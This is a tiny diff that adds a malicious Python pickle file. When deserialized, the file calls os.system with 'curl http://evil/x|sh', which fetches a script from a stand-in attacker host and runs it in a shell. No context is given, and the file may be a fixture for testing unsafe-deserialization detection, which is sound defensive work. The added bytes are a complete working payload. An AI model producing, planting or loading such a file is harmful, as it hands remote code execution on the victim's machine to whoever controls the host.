@@ -1,0 +1,3 @@
+€cos
+system
+Ucurl http://evil/x|sh…R.
